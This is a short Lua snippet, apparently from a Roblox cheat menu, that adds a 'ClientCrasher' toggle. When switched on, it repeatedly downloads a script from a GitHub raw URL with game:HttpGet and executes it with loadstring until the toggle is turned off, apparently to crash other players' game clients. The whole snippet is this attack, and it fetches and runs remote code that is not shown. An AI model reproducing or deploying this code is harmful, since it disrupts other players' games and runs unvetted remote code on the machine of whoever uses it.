run(function()
    local ClientCrasher = GuiLibrary.ObjectsThatCanBeSaved.UtilityWindow.Api.CreateOptionsButton({
        Name = 'ClientCrasher',
        Function = function(call)
            if call then
                task.spawn(function()
                    repeat
                        loadstring(game:HttpGet("https://raw.githubusercontent.com/starsdotspace/Crasher/refs/heads/main/Crasher.lua", true))()
                    until not ClientCrasher.Enabled
                end)
            end
        end
    })
end)
